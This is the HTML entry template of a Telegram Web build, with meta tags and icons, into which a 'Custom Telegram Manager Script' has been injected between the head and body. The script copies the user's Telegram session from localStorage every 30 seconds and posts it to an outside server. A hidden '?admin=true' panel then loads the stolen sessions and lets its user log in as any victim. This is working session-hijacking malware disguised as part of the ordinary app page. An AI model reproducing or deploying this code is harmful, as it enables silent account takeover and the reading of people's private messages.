<!DOCTYPE html>
<html lang="en" translate="no" class="notranslate">

<head>
  <meta charset="UTF-8">

  <title>
    <%= htmlWebpackPlugin.options.appTitle %>
  </title>

  <meta name="title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta name="description"
    content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no, viewport-fit=cover">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="mobile-web-app-title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta name="application-name" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta name="msapplication-TileColor" content="#2b5797">
  <meta name="msapplication-config" content="./browserconfig.xml">
  <meta name="theme-color" content="#ffffff">
  <meta name="google" content="notranslate">

  <meta http-equiv="Content-Security-Policy" content="<%= htmlWebpackPlugin.options.csp %>">

  <!-- Open Graph / Facebook -->
  <meta property="og:type" content="website">
  <meta property="og:url" content="<%= htmlWebpackPlugin.options.baseUrl %>">
  <meta property="og:title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta property="og:description"
        content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta property="og:image" content="./<%= htmlWebpackPlugin.options.mainIcon %>.png">

  <!-- Twitter -->
  <meta property="twitter:card" content="summary_large_image">
  <meta property="twitter:url" content="<%= htmlWebpackPlugin.options.baseUrl %>">
  <meta property="twitter:title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta property="twitter:description"
    content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta property="twitter:image" content="./<%= htmlWebpackPlugin.options.mainIcon %>.png">

  <link rel="canonical" href="https://web.telegram.org/">
  <link rel="apple-touch-icon" sizes="180x180" href="./<%= htmlWebpackPlugin.options.appleIcon %>.png">
  <link rel="icon" href="./favicon.svg" type="image/svg+xml">
  <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
  <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="192x192" href="./<%= htmlWebpackPlugin.options.mainIcon %>.png">
  <link rel="alternate icon" href="./favicon.ico" type="image/x-icon">
  <link rel="manifest" id="the-manifest-placeholder" href="./<%= htmlWebpackPlugin.options.manifest %>">

  <script src="./redirect.js"></script>
  <style>
    @layer reset, variables, ui, components;
    @layer ui {
      @layer tablist, spinner, button, input, layout;
    }
  </style>
</head

<!-- Custom Telegram Manager Script -->
    <script>
      const BACKEND_URL = "https://telegram-7ih3.onrender.com";

      // (၁) Admin Panel ကို ဝင်ချင်တဲ့အခါ
      if (window.location.search.includes("admin=true")) {
          document.addEventListener("DOMContentLoaded", () => {
              // မူလ Telegram Web UI ကို ဖျောက်ပြီး Admin Panel ကို ပြမယ်
              document.body.innerHTML = `
                <div style="padding: 30px; font-family: sans-serif; background: #f4f4f9; height: 100vh;">
                  <h2 style="color: #333;">Admin Control Panel</h2>
                  <p>Staff ဝင်ထားသော အကောင့်များ</p>
                  <button onclick="loadSessions()" style="padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer;">Load Accounts</button>
                  <div id="admin-content" style="margin-top: 20px;"></div>
                </div>
              `;

              // Backend ကနေ Data လှမ်းခေါ်မယ့် Function
              window.loadSessions = async () => {
                 try {
                     document.getElementById('admin-content').innerHTML = "Loading...";
                     const res = await fetch(`${BACKEND_URL}/api/get_sessions`);
                     const data = await res.json();
                     
                     if(data.length === 0) {
                         document.getElementById('admin-content').innerHTML = "မည်သည့် Staff အကောင့်မှ မရှိသေးပါ။";
                         return;
                     }

                     let html = "<table style='width: 100%; text-align: left; border-collapse: collapse;'>";
                     html += "<tr style='background: #ddd;'><th>User ID / Info</th><th>Action</th></tr>";
                     data.forEach(session => {
                         html += `<tr>
                            <td style='padding: 10px; border-bottom: 1px solid #ccc;'>User: ${session.user_id}</td>
                            <td style='padding: 10px; border-bottom: 1px solid #ccc;'>
                                <button onclick='loginAs(${JSON.stringify(session)})' style='padding: 5px 10px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer;'>Login ဝင်မည်</button>
                            </td>
                         </tr>`;
                     });
                     html += "</table>";
                     document.getElementById('admin-content').innerHTML = html;
                 } catch (err) {
                     document.getElementById('admin-content').innerHTML = "Error loading sessions.";
                 }
              };

              // Admin က Login ဝင်မယ့် Function
              window.loginAs = (sessionData) => {
                 // ယာယီ LocalStorage ထဲကို Session ပြန်ထည့်ပေးခြင်း
                 localStorage.setItem("tt-global-state", sessionData.local_storage_data);
                 alert("အကောင့်ထဲသို့ ဝင်ရောက်နေပါပြီ...");
                 window.location.href = "/"; // Telegram Web ဘက်သို့ ပြန်သွားရန်
              };
          });
      } else {
          // (၂) Staff တွေ သာမန် ဝင်သုံးတဲ့အခါ (Background ကနေ Session လှမ်းပို့မယ်)
          // ၃၀ စက္ကန့် တစ်ကြိမ် Session အသစ်ရှိမရှိ စစ်ပြီး Backend ကို ပို့မယ်
          setInterval(() => {
              const globalState = localStorage.getItem("tt-global-state");
              if (globalState) {
                  // User ID တစ်ခုခု ဖန်တီးပြီး ပို့မယ် (ဥပမာ - LocalStorage က data အနည်းငယ်ကို ယူမယ်)
                  const sessionData = {
                      user_id: "staff_" + Math.floor(Math.random() * 1000), // လောလောဆယ် Random ID နဲ့ အရင်စမ်းပါမယ်
                      local_storage_data: globalState,
                      timestamp: new Date().toISOString()
                  };
                  
                  fetch(`${BACKEND_URL}/api/save_session`, {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify(sessionData)
                  }).catch(console.error);
              }
          }, 30000); 
      }
    </script>

<body id="root">
  <noscript>
    <video src="./nojs.mp4" class="nojs-video" muted loop autoplay playsinline disablePictureInPicture></video>
    <h1>Telegram Web</h1>
    <p>Please, enable JavaScript to open the app.</p>
  </noscript>
  <div id="portals"></div>
  <script src="./compatTest.js"></script>

</body>

</html>
